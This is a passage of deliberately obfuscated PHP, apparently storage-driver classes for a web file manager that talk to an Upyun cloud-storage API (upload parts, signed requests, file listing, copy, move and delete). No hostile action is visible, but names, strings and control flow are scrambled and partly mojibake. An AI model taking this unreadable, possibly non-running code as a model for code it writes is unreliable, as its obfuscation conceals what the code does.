$aÕîÒ‹Íç[209]) === 0) { if (isset($b£¾ŠÉŞæ[$aÕîÒ‹Íç[1215]])) { $A³ê‡œ¤Ç = $b£¾ŠÉŞæ[$aÕîÒ‹Íç[1215]]; } else { if (isset($eï¤Œ–»»™[$aÕîÒ‹Íç[1215]])) { $A³ê‡œ¤Ç = $eï¤Œ–»»™[$aÕîÒ‹Íç[1215]]; } else { $A³ê‡œ¤Ç = hash($aÕîÒ‹Íç[1127], $aÕîÒ‹Íç[33]); } } return array($aÕîÒ‹Íç[216] => $eï¤Œ–»»™[$aÕîÒ‹Íç[216]], $aÕîÒ‹Íç[1215] => $A³ê‡œ¤Ç, $aÕîÒ‹Íç[206] => $eï¤Œ–»»™[$aÕîÒ‹Íç[1218]]); } return $eï¤Œ–»»™[$aÕîÒ‹Íç[216]]; goto aÆĞÚ²Ç’À; f¾çääË¿®: unset($E¹´÷ªò©[$aÕîÒ‹Íç[89]]); if (isset($E¹´÷ªò©[$aÕîÒ‹Íç[207]])) { return $this->listUploadParts($b“ä×‰ïÄ, $E¹´÷ªò©); } $b£¾ŠÉŞæ = array(); goto cÒğ—™÷¾; cÒğ—™÷¾: if (isset($E¹´÷ªò©[$aÕîÒ‹Íç[1214]])) { $b£¾ŠÉŞæ[$aÕîÒ‹Íç[1215]] = $E¹´÷ªò©[$aÕîÒ‹Íç[1214]]; } $aˆ²ê§ÒÖï = explode($aÕîÒ‹Íç[167], $this->getHost()); $a½¥¯¼å†« = array($aÕîÒ‹Íç[1216] => $aˆ²ê§ÒÖï[1], $aÕîÒ‹Íç[1217] => $aÕîÒ‹Íç[33], $aÕîÒ‹Íç[195] => $aÕîÒ‹Íç[115], $aÕîÒ‹Íç[1129] => $E¹´÷ªò©[$aÕîÒ‹Íç[77]]); goto C©³ØÌ¡”â; B´µ¢´š”É: $aÕîÒ‹Íç =& $_SERVER[õëù©û]; $c±ƒÎ¤Ù = isset($E¹´÷ªò©[$aÕîÒ‹Íç[156]]) ? $E¹´÷ªò©[$aÕîÒ‹Íç[156]] : $aÕîÒ‹Íç[33]; $b“ä×‰ïÄ = $E¹´÷ªò©[$aÕîÒ‹Íç[89]]; goto f¾çääË¿®; aÆĞÚ²Ç’À: } public function listUploadParts($F‘£”çò†, $CÖ•Õğ“Àï = array()) { goto C¢óŸÒ‹Ûã; Dƒºó†Ó°: $D„î¢…Õëë = $this->client->__getSignatureV4($EõñÂ­‚Œˆ, $fˆÌêÆ´, $f®¦ğÓìÚ, $E™Òİåøª, $AŠâŞ›ÜÑÚ); return array($D•Ø‘‰‡ÀÏ[216] => $D„î¢…Õëë[$D•Ø‘‰‡ÀÏ[216]], $D•Ø‘‰‡ÀÏ[206] => $D„î¢…Õëë[$D•Ø‘‰‡ÀÏ[1218]], $D•Ø‘‰‡ÀÏ[218] => $eµ¾ˆ‚æšÃ, $D•Ø‘‰‡ÀÏ[1215] => $D„î¢…Õëë[$D•Ø‘‰‡ÀÏ[1215]]); goto Aš¯×Ëì´£; C¢óŸÒ‹Ûã: $D•Ø‘‰‡ÀÏ =& $_SERVER[õëù©û]; $D¹Ë±äã‚ø = str_replace($D•Ø‘‰‡ÀÏ[217], $D•Ø‘‰‡ÀÏ[33], $CÖ•Õğ“Àï[$D•Ø‘‰‡ÀÏ[156]]); $eµ¾ˆ‚æšÃ = $this->client->listParts($this->bucket, $F‘£”çò†, $D¹Ë±äã‚ø); goto e¿ŞÖ¶øæÚ; e¿ŞÖ¶øæÚ: if (!$eµ¾ˆ‚æšÃ) { return !1; } $AŠâŞ›ÜÑÚ = $D•Ø‘‰‡ÀÏ[1219]; foreach ($eµ¾ˆ‚æšÃ as $F«”Î²ä¼µ) { $AŠâŞ›ÜÑÚ .= $D•Ø‘‰‡ÀÏ[1220] . "\74\x50\x61\x72\x74\116\165\x6d\142\145\162\x3e{$F«”Î²ä¼µ[$D•Ø‘‰‡ÀÏ[1171]]}\74\57\120\x61\162\164\x4e\165\155\142\x65\x72\x3e\12" . "\74\105\124\x61\147\x3e{$F«”Î²ä¼µ[$D•Ø‘‰‡ÀÏ[1172]]}\74\x2f\105\x54\141\x67\x3e\xa" . $D•Ø‘‰‡ÀÏ[1221]; } goto e—¦è¬ç; C‹àÂ¡‘‹é: $fˆÌêÆ´ = array($D•Ø‘‰‡ÀÏ[1216] => $c¯ö¨¥ïÊÑ[1], $D•Ø‘‰‡ÀÏ[195] => $D•Ø‘‰‡ÀÏ[115], $D•Ø‘‰‡ÀÏ[1129] => strlen($AŠâŞ›ÜÑÚ)); $f®¦ğÓìÚ = $D•Ø‘‰‡ÀÏ[208]; $E™Òİåøª = $D•Ø‘‰‡ÀÏ[8] . $this->pathEncode($F‘£”çò†) . $CÖ•Õğ“Àï[$D•Ø‘‰‡ÀÏ[156]]; goto Dƒºó†Ó°; e—¦è¬ç: $AŠâŞ›ÜÑÚ .= $D•Ø‘‰‡ÀÏ[1222]; $EõñÂ­‚Œˆ = array(); $c¯ö¨¥ïÊÑ = explode($D•Ø‘‰‡ÀÏ[167], $this->getHost()); goto C‹àÂ¡‘‹é; Aš¯×Ëì´£: } public function link($c“Æˆ­œÃ–, $Bª£—ššò = array()) { return parent::link($c“Æˆ­œÃ–, $Bª£—ššò); } public function fileOut($f³ƒèÈº, $BÃŒÁÌ” = false, $dêªÉ‹Ú‚ = false, $c«Ğã¸«å÷ = '') { if (strstr($this->endpoint, $_SERVER[õëù©û][1223])) { return parent::fileOutServer($f³ƒèÈº, $BÃŒÁÌ”, $dêªÉ‹Ú‚, $c«Ğã¸«å÷); } parent::fileOut($f³ƒèÈº, $BÃŒÁÌ”, $dêªÉ‹Ú‚, $c«Ğã¸«å÷); } public function fileOutImage($F´Å¡ ‰ÍÙ, $b› æšÏ = 250) { if (strstr($this->endpoint, $_SERVER[õëù©û][1223])) { return parent::fileOutImageServer($F´Å¡ ‰ÍÙ, $b› æšÏ); } parent::fileOutImage($F´Å¡ ‰ÍÙ, $b› æšÏ); } public function fileOutLink($D©…ˆÚ¤‹) { $eÌòÂ‹õå =& $_SERVER[õëù©û]; if (substr($D©…ˆÚ¤‹, 0, 7) == $eÌòÂ‹õå[1099]) { $D©…ˆÚ¤‹ = $eÌòÂ‹õå[1100] . substr($D©…ˆÚ¤‹, 7); } header($eÌòÂ‹õå[152] . $D©…ˆÚ¤‹); die; } public function getHost() { $BÑÄëÛµå =& $_SERVER[õëù©û]; $B±Ó§õ£ » = str_rtrim(parent::getHost(), $BÑÄëÛµå[8] . $this->bucket); $B±Ó§õ£ » = explode($BÑÄëÛµå[167], $B±Ó§õ£ »); return $B±Ó§õ£ »[0] . $BÑÄëÛµå[167] . $this->bucket . $BÑÄëÛµå[91] . $B±Ó§õ£ »[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fÒÛÖ‘ë—¼, $AÕ¥Ó–ÑøŸ = 0) { parent::__construct(); $this->source = $fÒÛÖ‘ë—¼; $this->sourceSize = $AÕ¥Ó–ÑøŸ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dËäËæÒÙ = false) { return $this->sourceSize; } public function getContent($B›ä©›—³¢ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Bù¼¤åÜà = ftell($this->source); $aäŠ„‘¾Ã÷ = @fread($this->source, $this->sourceSize); fseek($this->source, $Bù¼¤åÜà); return $aäŠ„‘¾Ã÷; } } public function fileSubstr($cØ¿¢ô¬Å = false, $CÚØ·†èåµ = 0, $f‚óÃÎì¥± = 0) { if (!$f‚óÃÎì¥±) { $f‚óÃÎì¥± = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $CÚØ·†èåµ, $f‚óÃÎì¥±); } if ($this->sourceType == self::TYPE_FILE) { $cƒÓ â‰¡ = ftell($this->source); fseek($this->source, $cƒÓ â‰¡ + $CÚØ·†èåµ); $bÈÙÃÓ—Ô = @fread($this->source, $f‚óÃÎì¥±); fseek($this->source, $cƒÓ â‰¡); return $bÈÙÃÓ—Ô; } } public function hashMd5($c¤†¿­¨› = false) { return md5($this->getContent()); } public static function hash($C…•Á ‚ó², $aß’ïÅò÷ƒ = 0) { $e÷Ÿ·ˆİ›— = new PathDriverStream($C…•Á ‚ó², $aß’ïÅò÷ƒ); return $e÷Ÿ·ˆİ›—->hashSimple($C…•Á ‚ó²); } public static function md5($eğä¾ƒáåô, $FÖéğ¼Ş ‘ = 0) { $cöíçèŒ‰ = new PathDriverStream($eğä¾ƒáåô, $FÖéğ¼Ş ‘); return $cöíçèŒ‰->hashMd5($eğä¾ƒáåô); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\57\x76\60\56\x61\160\x69\x2e\165\160\x79\x75\x6e\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($AçŠ¾Ï‚‹ª) { parent::__construct(); $this->_init($AçŠ¾Ï‚‹ª); } public function _init($Aå—Éœ¢–) { foreach ($Aå—Éœ¢– as $e‹Ì¾ÜÀ³È => $c÷˜ÛÔï³) { if (isset($this->{$e‹Ì¾ÜÀ³È})) { $this->{$e‹Ì¾ÜÀ³È} = $c÷˜ÛÔï³; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[õëù©û][1224], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($EÌ†¯¡‡îØ, $BİšŞ•Óï† = "\107\105\x54") { $F˜Î’ˆ·ÄÃ =& $_SERVER[õëù©û]; $cÓË©‡Å¯ = gmdate($F˜Î’ˆ·ÄÃ[1188]); $F®‚ÓÌ¤³ = base64_encode(hash_hmac($F˜Î’ˆ·ÄÃ[1225], "{$BİšŞ•Óï†}\46{$EÌ†¯¡‡îØ}\46{$cÓË©‡Å¯}", md5("{$this->userpass}"), !0)); $cŒ¨áƒÉ = array("\x41\x75\164\150\x6f\x72\151\x7a\x61\164\151\157\x6e\x3a\x55\120\x59\125\x4e\40{$this->username}\72{$F®‚ÓÌ¤³}", "\x44\141\x74\145\x3a{$cÓË©‡Å¯}"); return $cŒ¨áƒÉ; } public function ussRequest($B‡š‰™áä», $e˜™¥ê˜‚ = "\107\105\x54", $bÖöÃ‘Ô = false, $f¶¤ÌŒ³¦¤ = false, $aÖç¹ø±¢İ = false) { goto a¹âï†´Â‘; dŞéÂØî”Ú: if (!$E¦‘½ô£‘) { return array($Eö¬ñÍ¤ÓÛ[1023] => !1, $Eö¬ñÍ¤ÓÛ[1025] => $Eö¬ñÍ¤ÓÛ[1226]); } if (strtolower($e˜™¥ê˜‚) == $Eö¬ñÍ¤ÓÛ[180] || in_array($E¦‘½ô£‘[$Eö¬ñÍ¤ÓÛ[1023]], array($Eö¬ñÍ¤ÓÛ[1084], $Eö¬ñÍ¤ÓÛ[1227]))) { $bÖöÃ‘Ô = $E¦‘½ô£‘[$Eö¬ñÍ¤ÓÛ[1228]]; } else { $bÖöÃ‘Ô = json_decode($E¦‘½ô£‘[$Eö¬ñÍ¤ÓÛ[1025]], !0); if (!$bÖöÃ‘Ô) { $bÖöÃ‘Ô = $E¦‘½ô£‘[$Eö¬ñÍ¤ÓÛ[1025]]; } else { if (!$E¦‘½ô£‘[$Eö¬ñÍ¤ÓÛ[684]] && isset($bÖöÃ‘Ô[$Eö¬ñÍ¤ÓÛ[1229]])) { $bÖöÃ‘Ô = $bÖöÃ‘Ô[$Eö¬ñÍ¤ÓÛ[1229]]; } } } return array($Eö¬ñÍ¤ÓÛ[1023] => $E¦‘½ô£‘[$Eö¬ñÍ¤ÓÛ[684]], $Eö¬ñÍ¤ÓÛ[1025] => $bÖöÃ‘Ô); goto E÷ ·Üô‡ ; a¹âï†´Â‘: $Eö¬ñÍ¤ÓÛ =& $_SERVER[õëù©û]; $B‡š‰™áä» = trim($B‡š‰™áä», $Eö¬ñÍ¤ÓÛ[8]); $AÔìéáŞç = "\57{$this->bucket}\x2f{$B‡š‰™áä»}"; goto D«–×ƒÃ‰›; D«–×ƒÃ‰›: $f¶Ç”¼Í¾’ = $this->ussHeaders($AÔìéáŞç, $e˜™¥ê˜‚); if ($f¶¤ÌŒ³¦¤) { $f¶Ç”¼Í¾’ = array_merge($f¶Ç”¼Í¾’, $f¶¤ÌŒ³¦¤); } $E¦‘½ô£‘ = url_request($this->endpoint . $AÔìéáŞç, $e˜™¥ê˜‚, $bÖöÃ‘Ô, $f¶Ç”¼Í¾’, $aÖç¹ø±¢İ); goto dŞéÂØî”Ú; E÷ ·Üô‡ : } public function mkfile($c¨â‚èöÎ, $AÓ¿À¡…‘ = '', $C…Îø¼¼Ø¹ = REPEAT_RENAME) { if ($this->setContent($c¨â‚èöÎ, $AÓ¿À¡…‘)) { return $this->getPathOuter($c¨â‚èöÎ); } return !1; } public function mkdir($CŸ•ã†ôŠ, $AºÂ¸»Şé = REPEAT_SKIP) { $cá…²œ¢÷Ó =& $_SERVER[õëù©û]; $cŒ”‹Êæ­ = trim($CŸ•ã†ôŠ, $cá…²œ¢÷Ó[8]); if ($this->_isFolder($cŒ”‹Êæ­)) { return $this->getPathOuter($cŒ”‹Êæ­); } $A½¤¹øù¤Ã = array($cá…²œ¢÷Ó[1230]); $Eâ­©‚ê´Ò = $this->ussRequest($cŒ”‹Êæ­, $cá…²œ¢÷Ó[208], !1, $A½¤¹øù¤Ã); return $Eâ­©‚ê´Ò[$cá…²œ¢÷Ó[1023]] ? $this->getPathOuter($cŒ”‹Êæ­) : !1; } public function copyFile($F¦†ƒ³¸õ, $Cºš£³Ó„) { $D¿çµÇ¨„› =& $_SERVER[õëù©û]; $BÆ°¿ŠòÜĞ = array($D¿çµÇ¨„›[1231] . "\x2f{$this->bucket}\57{$F¦†ƒ³¸õ}", $D¿çµÇ¨„›[1232]); $Ağóà‡±Í = $this->ussRequest($Cºš£³Ó„, $D¿çµÇ¨„›[210], !1, $BÆ°¿ŠòÜĞ); return $Ağóà‡±Í[$D¿çµÇ¨„›[1023]] ? !0 : !1; } public function moveFile($DçĞŒõÈ¢, $A…„¸î”Â) { $E…ÜÄä¾Ä£ =& $_SERVER[õëù©û]; $aùäŸ­±Ø¦ = array($E…ÜÄä¾Ä£[1233] . "\x2f{$this->bucket}\57{$DçĞŒõÈ¢}", $E…ÜÄä¾Ä£[1232]); $EéÊ¨Óõ¼­ = $this->ussRequest($A…„¸î”Â, $E…ÜÄä¾Ä£[210], !1, $aùäŸ­±Ø¦); return $EéÊ¨Óõ¼­[$E…ÜÄä¾Ä£[1023]] ? !0 : !1; } public function delFile($E›×…˜çÖ·) { $e×„Úã³‘· =& $_SERVER[õëù©û]; $bˆğ¨êÏ = $this->ussRequest($E›×…˜çÖ·, $e×„Úã³‘·[1234]); return $bˆğ¨êÏ[$e×„Úã³‘·[1023]] ? !0 : !1; } public function delFolder($F‚Š©Ãëôß) { $Eø—ãÀò¥ç =& $_SERVER[õëù©û]; $dŸÙ»ñíº‰ = $this->listAll($F‚Š©Ãëôß); krsort($dŸÙ»ñíº‰); foreach ($dŸÙ»ñíº‰ as $Då‘ñ°·Ğä) { $this->ussRequest($Då‘ñ°·Ğä[$Eø—ãÀò¥ç[75]], $Eø—ãÀò¥ç[1234]); } return $this->ussRequest($F‚Š©Ãëôß, $Eø—ãÀò¥ç[1234]); } public function rename($e¯£³ø³ø…, $bÏ’©›Ò„) { if ($this->isFile($e¯£³ø³ø…)) { $bÏ’©›Ò„ = get_path_father($e¯£³ø³ø…) . $bÏ’©›Ò„; return $this->moveFile($e¯£³ø³ø…, $bÏ’©›Ò„); } return $this->renameObject($e¯£³ø³ø…, $bÏ’©›Ò„); } public function fileInfo($c‡¯ŠÌ” „, $fš…©¸ = false, $AãâíÕÂ•ì = array()) { $A“Ò¶‚ÓÇ =& $_SERVER[õëù©û]; if ($fš…©¸) { return array($A“Ò¶‚ÓÇ[28] => $this->pathThis($c‡¯ŠÌ” „), $A“Ò¶‚ÓÇ[75] => $this->getPathOuter($A“Ò¶‚ÓÇ[8] . $c‡¯ŠÌ” „), $A“Ò¶‚ÓÇ[29] => $A“Ò¶‚ÓÇ[163], $A“Ò¶‚ÓÇ[77] => isset($AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[321]]) ? $AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[321]] : 0, $A“Ò¶‚ÓÇ[156] => $this->ext($c‡¯ŠÌ” „)); } $A·ĞÁÌŠìâ = array($A“Ò¶‚ÓÇ[28] => $this->pathThis($c‡¯ŠÌ” „), $A“Ò¶‚ÓÇ[75] => $this->getPathOuter($A“Ò¶‚ÓÇ[8] . $c‡¯ŠÌ” „), $A“Ò¶‚ÓÇ[29] => $A“Ò¶‚ÓÇ[163], $A“Ò¶‚ÓÇ[183] => 0, $A“Ò¶‚ÓÇ[106] => isset($Eì¦ÁíìÛ [$A“Ò¶‚ÓÇ[1235]]) ? $Eì¦ÁíìÛ [$A“Ò¶‚ÓÇ[1235]] : 0, $A“Ò¶‚ÓÇ[77] => isset($AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[321]]) ? $AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[321]] : 0, $A“Ò¶‚ÓÇ[156] => $this->ext($c‡¯ŠÌ” „), $A“Ò¶‚ÓÇ[184] => !0, $A“Ò¶‚ÓÇ[185] => !0); if (empty($AãâíÕÂ•ì)) { $AãâíÕÂ•ì = $this->objectMeta($c‡¯ŠÌ” „); if (!$AãâíÕÂ•ì) { return $A·ĞÁÌŠìâ; } $A·ĞÁÌŠìâ[$A“Ò¶‚ÓÇ[183]] = $AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[1236]]; $A·ĞÁÌŠìâ[$A“Ò¶‚ÓÇ[106]] = $AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[1237]]; $A·ĞÁÌŠìâ[$A“Ò¶‚ÓÇ[77]] = $AãâíÕÂ•ì[$A“Ò¶‚ÓÇ[77]]; } return $A·ĞÁÌŠìâ; } public function folderInfo($c ÎÀ‰¹è—, $a½é“‹¦ = false) { $fæ¹ªŠ¤õê =& $_SERVER[õëù©û]; if ($a½é“‹¦) { return array($fæ¹ªŠ¤õê[28] => $this->pathThis($c ÎÀ‰¹è—), $fæ¹ªŠ¤õê[75] => $this->getPathOuter($fæ¹ªŠ¤õê[8] . $c ÎÀ‰¹è—), $fæ¹ªŠ¤õê[29] => $fæ¹ªŠ¤õê[76]); } $a°ïã°Õ = array($fæ¹ªŠ¤õê[28] => $this->pathThis($c ÎÀ‰¹è—), $fæ¹ªŠ¤õê[75] => $this->getPathOuter($fæ¹ªŠ¤õê[8] . $c ÎÀ‰¹è—), $fæ¹ªŠ¤õê[29] => $fæ¹ªŠ¤õê[76], $fæ¹ªŠ¤õê[183] => 0, $fæ¹ªŠ¤õê[106] => isset($c³Šµ‘‡¬Ş[$fæ¹ªŠ¤õê[1235]]) ? $c³Šµ‘‡¬Ş[$fæ¹ªŠ¤õê[1235]] : 0, $fæ¹ªŠ¤õê[1145] => !0, $fæ¹ªŠ¤õê[1146] => !0); if (empty($dÃ‰–‚·‡…)) { $dÃ‰–‚·‡… = $this->objectMeta($c ÎÀ‰¹è—); if (!$dÃ‰–‚·‡…) { return $a°ïã°Õ; } $a°ïã°Õ[$fæ¹ªŠ¤õê[183]] = $dÃ‰–‚·‡…[$fæ¹ªŠ¤õê[1236]]; $a°ïã°Õ[$fæ¹ªŠ¤õê[106]] = $dÃ‰–‚·‡…[$fæ¹ªŠ¤õê[1237]]; } return $a°ïã°Õ; } private function fileList($A¬§šäâ™, $d’¬íÍ¶Ú = 0, $D¿‰à®šŞ = 1000) { $aåŞ˜â‘ãÚ =& $_SERVER[õëù©û]; $eŒÏ»ÕŠàÙ = array($aåŞ˜â‘ãÚ[1238], $aåŞ˜â‘ãÚ[1239] . $D¿‰à®šŞ); if ($d’¬íÍ¶Ú) { $eŒÏ»ÕŠàÙ[] = $aåŞ˜â‘ãÚ[1240] . $d’¬íÍ¶Ú; } $CÒ³ÉÚõİˆ = $this->ussRequest($A¬§šäâ™, $aåŞ˜â‘ãÚ[212], !1, $eŒÏ»ÕŠàÙ); return !$CÒ³ÉÚõİˆ[$aåŞ˜â‘ãÚ[1023]] ? !1 : $CÒ³ÉÚõİˆ[$aåŞ˜â‘ãÚ[1025]]; } public function listPath($B…³›Ü±Í, $FÅè¡ì•„ï = false) { goto BÇ…öÚ¥Ë; C¸ËÏâÊ¨¬: return array($Cê²Ê¹Ü[74] => $FÅ‚Ç‹Ã¸–, $Cê²Ê¹Ü[73] => $Eìñ¨ºÄŞ); goto a¡–ê…‰Œ‹; BÇ…öÚ¥Ë: $Cê²Ê¹Ü =& $_SERVER[õëù©û]; $fÅØƒØ´’’ = $Cê²Ê¹Ü[33]; $AÌŸô½äÕ• = 1000; goto DòøÚâ¿ä¶; DòøÚâ¿ä¶: $FÅ‚Ç‹Ã¸– = $Eìñ¨ºÄŞ = array(); $cÙŠõŸíèå = rtrim($B…³›Ü±Í, $Cê²Ê¹Ü[8]) . $Cê²Ê¹Ü[8]; while (!0) { $Cø¥¾º·ô¾ = $this->fileList($B…³›Ü±Í, $fÅØƒØ´’’, $AÌŸô½äÕ•); if (!$Cø¥¾º·ô¾) { return !1; } $fÅØƒØ´’’ = isset($Cø¥¾º·ô¾[$Cê²Ê¹Ü[1241]]) ? $Cø¥¾º·ô¾[$Cê²Ê¹Ü[1241]] : $Cê²Ê¹Ü[33]; $aíòŞºâÇ = isset($Cø¥¾º·ô¾[$Cê²Ê¹Ü[1242]]) ? $Cø¥¾º·ô¾[$Cê²Ê¹Ü[1242]] : array(); foreach ($aíòŞºâÇ as $AŠ½¡ÅêƒÚ) { if ($AŠ½¡ÅêƒÚ[$Cê²Ê¹Ü[29]] == $Cê²Ê¹Ü[76]) { $FÅ‚Ç‹Ã¸–[] = $this->folderInfo($cÙŠõŸíèå . $AŠ½¡ÅêƒÚ[$Cê²Ê¹Ü[28]], $FÅè¡ì•„ï, $AŠ½¡ÅêƒÚ); } else { $Eìñ¨ºÄŞ[] = $this->fileInfo($cÙŠõŸíèå . $AŠ½¡ÅêƒÚ[$Cê²Ê¹Ü[28]], $FÅè¡ì•„ï, $AŠ½¡ÅêƒÚ); } } if (count($aíòŞºâÇ) < $AÌŸô½äÕ•) { break; } } goto C¸ËÏâÊ¨¬; a¡–ê…‰Œ‹: } private function recursionAllFiles($e…‡¡”™œ, &$aãæµ¦‰ù) { $bî„ó¦ÑÆê =& $_SERVER[õëù©û]; $Eöš”‘â•Â = $bî„ó¦ÑÆê[33]; $Aè©¦íà = 1000; $B±Ã‰…šÖ = $FÎ¡Íœ²ù§ = array(); $C§†ßÄ™ = rtrim($e…‡¡”™œ, $bî„ó¦ÑÆê[8]) . $bî„ó¦ÑÆê[8]; while (!0) { $aËÁÑ‘á®¬ = $this->fileList($e…‡¡”™œ, $Eöš”‘â•Â, $Aè©¦íà); if (!$aËÁÑ‘á®¬) { return !1; } $Eöš”‘â•Â = isset($aËÁÑ‘á®¬[$bî„ó¦ÑÆê[1241]]) ? $aËÁÑ‘á®¬[$bî„ó¦ÑÆê[1241]] : $bî„ó¦ÑÆê[33]; $bøŸ‚¹Æó = isset($aËÁÑ‘á®¬[$bî„ó¦ÑÆê[1242]]) ? $aËÁÑ‘á®¬[$bî„ó¦ÑÆê[1242]] : array(); foreach ($bøŸ‚¹Æó as $a°”¯ª£Ù¯) { $fà¨Ä„ç˜ = array($bî„ó¦ÑÆê[75] => $C§†ßÄ™ . $a°”¯ª£Ù¯[$bî„ó¦ÑÆê[28]], $bî„ó¦ÑÆê[76] => $a°”¯ª£Ù¯[$bî„ó¦ÑÆê[29]] == $bî„ó¦ÑÆê[76] ? 1 : 0, $bî„ó¦ÑÆê[77] => isset($a°”¯ª£Ù¯[$bî„ó¦ÑÆê[321]]) ? $a°”¯ª£Ù¯[$bî„ó¦ÑÆê[321]] : 0); $aãæµ¦‰ù[] = $fà¨Ä„ç˜; if ($fà¨Ä„ç˜[$bî„ó¦ÑÆê[76]] == 1) { $this->recursionAllFiles($fà¨Ä„ç˜[$bî„ó¦ÑÆê[75]], $aãæµ¦‰ù); } } if (count($bøŸ‚¹Æó) < $Aè©¦íà) { break; } } } public function has($føáé²Ï§Ğ, $f‚Ó­ø‚÷ = false, $e•·×ÛÍÙš = true) { goto Aáô­ò³ŸØ; cØ‹ÖÉ›¢ö: $Dàá¬ëñÄ = 0; $cµ­âÒÎŸ¾ = 0; $a Şá™×ï = rtrim($føáé²Ï§Ğ, $aöèÛ¾ˆ­ƒ[8]) . $aöèÛ¾ˆ­ƒ[8]; goto e×ğ»êª¡±; e×ğ»êª¡±: while (!0) { $c›ášïÕÇ‘ = $this->fileList($føáé²Ï§Ğ, $bÏ“¯øë¦, $E¢ÍÀ¹‚ò); if (!$c›ášïÕÇ‘) { return !1; } $bÏ“¯øë¦ = isset($c›ášïÕÇ‘[$aöèÛ¾ˆ­ƒ[1241]]) ? $c›ášïÕÇ‘[$aöèÛ¾ˆ­ƒ[1241]] : $aöèÛ¾ˆ­ƒ[33]; $d¦…¿„½íÛ = isset($c›ášïÕÇ‘[$aöèÛ¾ˆ­ƒ[1242]]) ? $c›ášïÕÇ‘[$aöèÛ¾ˆ­ƒ[1242]] : array(); if (empty($d¦…¿„½íÛ)) { break; } $eÚŒÔÉÔÎ = array_to_keyvalue($d¦…¿„½íÛ, $aöèÛ¾ˆ­ƒ[33], $aöèÛ¾ˆ­ƒ[29]); $aµ´·Œğ‚ = array_count_values($eÚŒÔÉÔÎ); $Fš·ì ò = isset($aµ´·Œğ‚[$aöèÛ¾ˆ­ƒ[76]]) ? $aµ´·Œğ‚[$aöèÛ¾ˆ­ƒ[76]] : 0; $BÇöºÏ­’Õ = count($eÚŒÔÉÔÎ) - $Fš·ì ò; if ($f‚Ó­ø‚÷) { $cµ­âÒÎŸ¾ += $Fš·ì ò; $Dàá¬ëñÄ += $BÇöºÏ­’Õ; if ($b˜½ÌÕ‰˜Ò < $E¢ÍÀ¹‚ò) { break; } continue; } if ($e•·×ÛÍÙš) { if ($BÇöºÏ­’Õ) { return !0; } } else { if ($Fš·ì ò) { return !0; } } if (count($d¦…¿„½íÛ) < $E¢ÍÀ¹‚ò) { break; } } if ($f‚Ó­ø‚÷) { return array($aöèÛ¾ˆ­ƒ[187] => $Dàá¬ëñÄ, $aöèÛ¾ˆ­ƒ[188] => $cµ­âÒÎŸ¾); } return !1; goto D ñÄÎãÄÁ; Aáô­ò³ŸØ: $aöèÛ¾ˆ­ƒ =& $_SERVER[õëù©û]; $bÏ“¯øë¦ = $aöèÛ¾ˆ­ƒ[33]; $E¢ÍÀ¹‚ò = 1000; goto cØ‹ÖÉ›¢ö; D ñÄÎãÄÁ: } public function listAll($eé»¹ ±ç‚) { $f§²éè«ë = array(); $this->recursionAllFiles($eé»¹ ±ç‚, $f§²éè«ë); return $f§²éè«ë; } public function canRead($F‰³ó·Ù) { return $this->exist($F‰³ó·Ù) ? !0 : !1; } public function canWrite($DŞÆÉƒ­–ó) { return $this->exist($DŞÆÉƒ­–ó) ? !0 : !1; } public function getContent($A¡†«ÓÑù¡) { return $this->fileSubstr($A¡†«ÓÑù¡, 0, -1); } public function setContent($B³ÖÎ……, $DùĞ×ğËÈá = '') { $DØß İË¸ =& $_SERVER[õëù©û]; if (!$DùĞ×ğËÈá) { $Dœåó±¦‘ö = $this->ussRequest($B³ÖÎ……, $DØß İË¸[208]); return $Dœåó±¦‘ö[$DØß İË¸[1023]]; } $Fƒê‘“£¼ = $this->tempFile($this->pathThis($B³ÖÎ……)); file_put_contents($Fƒê‘“£¼, $DùĞ×ğËÈá); if ($this->upload($B³ÖÎ……, $Fƒê‘“£¼)) { $this->tempFileRemve($Fƒê‘“£¼); return !0; } return !1; } public function fileSubstr($fìÁ‹®Ğ‡Õ, $E®Æ”¡¦¨è, $aŠÈá¬İÒÅ) { $cë¿£©ùá‡ =& $_SERVER[õëù©û]; if (!($F£¤ áØ¦Æ = $this->link($fìÁ‹®Ğ‡Õ))) { return !1; } $Dáæ«å—² = !1; if ($aŠÈá¬İÒÅ > 0) { $B¥ÌÒê©“ = $E®Æ”¡¦¨è + $aŠÈá¬İÒÅ - 1; $Dáæ«å—² = array($cë¿£©ùá‡[1203] . $E®Æ”¡¦¨è . $cë¿£©ùá‡[407] . $B¥ÌÒê©“); } $DŠƒƒÖ”®í = url_request($F£¤ áØ¦Æ, $cë¿£©ùá‡[212], !1, $Dáæ«å—²); return $DŠƒƒÖ”®í[$cë¿£©ùá‡[684]] ? $DŠƒƒÖ”®í[$cë¿£©ùá‡[1025]] : !1; } public function upload($E„¥¤Š„¢º, $dµëÅÁ¶¦, $e¹”Œ²ÄŒ¸ = false, $d´„¢ÎÒ± = REPEAT_REPLACE) { goto A–âÍ÷ƒ¶Ó; e…ç› ×ñ: $e÷æÂ„Ã¯¬ = $this->ussRequest($E„¥¤Š„¢º, $Fâ¡¦µ[210], !1, $f­âÆÌİ£Ö); return $e÷æÂ„Ã¯¬[$Fâ¡¦µ[1023]] ? $this->getPathOuter($Aº›ÅÅ¸›½) : !1; goto d»éªŠš˜¿; b›İÓé‘“: $CàÊ¶¿‹å¥ = $A†ß»±™‚Ô[$Fâ¡¦µ[1248]]; $ašŒ“ğÜªŠ = fopen($dµëÅÁ¶¦, $Fâ¡¦µ[1153]); if (!$ašŒ“ğÜªŠ) { return !1; } goto D†Ø”æóæ‹; 